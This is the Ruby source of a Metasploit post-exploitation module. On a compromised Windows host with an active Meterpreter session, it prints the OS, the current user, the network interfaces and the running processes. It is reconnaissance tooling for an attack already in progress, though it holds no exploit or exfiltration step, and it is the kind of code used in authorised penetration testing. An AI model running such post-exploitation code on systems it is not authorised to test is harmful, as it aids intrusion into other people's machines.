require 'msf/core'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::System
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Net
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Information Gathering Post Module',
      'Description'   => %q{
        This module gathers OS version, user accounts, network configuration,
        and running processes from a target Windows system once a Meterpreter session is active.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Diogo'],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter']
    ))

    register_options([
      OptInt.new('SESSION', [true, 'The session ID of the Meterpreter session'])
    ])
  end

  def run
    print_status("Gathering system information from #{session.session_host}")

    gather_system_info
    gather_user_info
    gather_network_info
    gather_running_processes
  end

  # System info
  def gather_system_info
    sysinfo = session.sys.config.sysinfo
    print_good("OS: #{sysinfo['OS']}")
    print_good("Computer: #{sysinfo['Computer']}")
  end

  # User info
  def gather_user_info
    uid = session.sys.config.getuid
    print_good("User: #{uid}")
  end

  # Network interfaces
  def gather_network_info
    interfaces = session.net.config.interfaces
    interfaces.each do |iface|
      next unless iface.addr && iface.name
      print_good("Interface: #{iface.name}, IP: #{iface.addr}, Netmask: #{iface.netmask}, Broadcast: #{iface.broadaddr}")
    end
  end

  # Running processes
  def gather_running_processes
    processes = session.sys.process.get_processes
    processes.each do |proc|
      print_good("Process #{proc['pid']} - #{proc['name']}")
    end
  end
end